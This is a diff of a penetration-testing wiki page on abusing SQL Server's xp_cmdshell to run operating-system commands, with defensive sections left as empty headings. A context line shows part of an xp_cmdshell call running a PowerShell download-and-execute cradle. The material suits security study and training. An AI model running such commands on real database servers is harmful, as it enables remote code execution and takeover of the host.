@@ -1,6 +1,16 @@
+---
+description: xp_cmdshell could be used to execute commands on the SQL Server.
+---
+
 # Executing Commands
 
-## PAGINA MOET NOG WORDEN UITGEBREID
+## Attacking
+
+### How it works
+
+[xp\_cmdshell](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15) is a SQL Server functionality that is disabled by default. However it can be enabled using sp\_configure. It spawns a Windows command shell and passes in a string for execution. Any output is returned as rows of text. The Windows process spawned by **** xp\_cmdshell has the same security rights as the SQL Server service account.
+
+### Executing the attack
 
 1. Enable xp\_cmdshell
 
@@ -28,3 +38,16 @@ EXEC master..xp_cmdshell 'powershell iex (New-Object Net.WebClient).DownloadStri
 ```
 
 ![](<../../../.gitbook/assets/image (45).png>)
+
+## Defending
+
+### Recommendations
+
+*
+
+### Detection
+
+
+
+## References
+
